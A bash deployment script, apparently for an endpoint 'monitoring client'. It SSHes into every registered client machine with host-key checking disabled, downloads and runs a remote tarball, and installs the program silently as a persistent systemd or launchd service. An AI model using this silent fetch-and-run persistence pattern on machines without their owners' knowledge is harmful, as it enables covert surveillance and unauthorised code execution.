#!/bin/bash
# Remote Silent Deploy via SSH
# Untuk PC yang sudah enable OpenSSH Server

SERVER_URL="https://tenjo.adilabs.id"
DASHBOARD_PATH="/var/www/Tenjo/dashboard"
PACKAGE_URL="$SERVER_URL/downloads/installer_package.tar.gz"

# SSH credentials (sesuaikan dengan user PC client)
SSH_USER="Administrator"
SSH_KEY="/root/.ssh/id_rsa"  # Or use password

echo "=== Tenjo SSH Remote Deployment ==="

# Get clients from database
CLIENTS=$(cd $DASHBOARD_PATH && php artisan tinker --execute="
echo json_encode(\App\Models\Client::where('ip_address', '!=', '172.16.7.215')
    ->get(['client_id', 'hostname', 'ip_address', 'username'])->toArray());
")

echo "Clients to deploy:"
echo "$CLIENTS" | jq -r '.[] | "\(.hostname) - \(.ip_address)"'

# Deploy function
deploy_to_client() {
    local IP=$1
    local HOSTNAME=$2
    local CLIENT_ID=$3
    
    echo ""
    echo "=== Deploying to $HOSTNAME ($IP) ==="
    
    # Test SSH connection
    if ! ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no $SSH_USER@$IP "echo Connected" 2>/dev/null; then
        echo "❌ Cannot connect via SSH to $IP"
        return 1
    fi
    
    echo "✅ SSH connection established"
    
    # Execute remote installation via SSH
    ssh -o StrictHostKeyChecking=no $SSH_USER@$IP bash << EOSSH
# Download installer
cd /tmp
curl -L -o tenjo_installer.tar.gz "$PACKAGE_URL"

# Extract
INSTALL_DIR="\$HOME/.tenjo/client"
mkdir -p "\$INSTALL_DIR"
tar -xzf tenjo_installer.tar.gz -C "\$INSTALL_DIR"

# Make executable
chmod +x "\$INSTALL_DIR/main.py"

# Create startup service (systemd for Linux, launchd for macOS)
if command -v systemctl &> /dev/null; then
    # Linux systemd
    cat > /tmp/tenjo.service << 'EOF'
[Unit]
Description=Tenjo Monitoring Client
After=network.target

[Service]
Type=simple
User=$USER
ExecStart=/usr/bin/python3 \$INSTALL_DIR/main.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
    sudo mv /tmp/tenjo.service /etc/systemd/system/
    sudo systemctl daemon-reload
    sudo systemctl enable tenjo.service
    sudo systemctl start tenjo.service
    
elif [[ "\$(uname)" == "Darwin" ]]; then
    # macOS launchd
    cat > ~/Library/LaunchAgents/com.tenjo.client.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.tenjo.client</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/python3</string>
        <string>\$INSTALL_DIR/main.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
    launchctl load ~/Library/LaunchAgents/com.tenjo.client.plist
fi

# Start immediately
nohup python3 "\$INSTALL_DIR/main.py" > /dev/null 2>&1 &

echo "✅ Installation completed on \$(hostname)"
EOSSH
    
    if [ $? -eq 0 ]; then
        echo "✅ Deployment successful to $HOSTNAME"
        
        # Update database
        cd $DASHBOARD_PATH && php artisan tinker --execute="
        \$client = \App\Models\Client::where('ip_address', '$IP')->first();
        if (\$client) {
            \$client->update([
                'pending_update' => false, 
                'update_completed_at' => now(),
                'update_version' => '2025.10.03'
            ]);
        }
        "
        return 0
    else
        echo "❌ Failed to deploy to $HOSTNAME"
        return 1
    fi
}

# Deploy to all clients
SUCCESS=0
FAILED=0

echo "$CLIENTS" | jq -c '.[]' | while read -r client; do
    IP=$(echo "$client" | jq -r '.ip_address')
    HOSTNAME=$(echo "$client" | jq -r '.hostname')
    CLIENT_ID=$(echo "$client" | jq -r '.client_id')
    
    if deploy_to_client "$IP" "$HOSTNAME" "$CLIENT_ID"; then
        ((SUCCESS++))
    else
        ((FAILED++))
    fi
    
    sleep 2
done

echo ""
echo "=== Deployment Summary ==="
echo "✅ Successful: $SUCCESS"
echo "❌ Failed: $FAILED"
echo ""
echo "Check dashboard: $SERVER_URL"
